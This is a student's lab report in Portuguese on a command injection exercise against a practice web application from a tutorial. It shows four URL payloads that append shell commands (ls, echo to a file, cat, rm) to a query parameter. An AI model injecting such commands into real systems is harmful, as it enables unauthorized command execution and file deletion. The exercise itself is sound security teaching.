# Command Injection
## Relatório da Prática

Para realizar a prática, segui as questões propostas no [tutorial](https://github.com/jordaos/Command-Injection-Tutorial).

Não senti dificuldades para realizar a prática. O tutorial estava muito explicativo.

Na prática foi utilizada a [aplicação online](http://commandinjection.herokuapp.com/) disponibilizada no tutorial para a realização dos ataques.

1. Listar arquivos do diretório.

    Para listar os arquivos do diretório onde está a página inicial dos site foi utilizado o comando `ls`. O comando completo ficou assim: 
    > `http://commandinjection.herokuapp.com/?dir=;ls`
    
    ![1](https://github.com/SamuelIGT/information-security/blob/master/Praticas/Command%20Injection/screenshots/1.PNG)

2. Criar arquivo
    Foi criado um arquivo dentro da pasta '/folder' através do seguinte comando:
    > `http://commandinjection.herokuapp.com/?dir=folder; echo "Prática - Samuel Alves" > SamuelAlves.txt`

    ![2](https://github.com/SamuelIGT/information-security/blob/master/Praticas/Command%20Injection/screenshots/2.PNG)

3. Listar conteúdo do arquivo
    Para listar o conteúdo do documento criado, foi utilizado o comando:
    > `http://commandinjection.herokuapp.com/?dir=files; cat SamuelAlves.txt`

    ![3](https://github.com/SamuelIGT/information-security/blob/master/Praticas/Command%20Injection/screenshots/3.PNG)

4. Apagar arquivo
    Para apagar o arquivo criado, foi utilizado o comando:
    > `http://commandinjection.herokuapp.com/?dir=files; rm SamuelAlves.txt`
    ![4](https://github.com/SamuelIGT/information-security/blob/master/Praticas/Command%20Injection/screenshots/4.PNG)
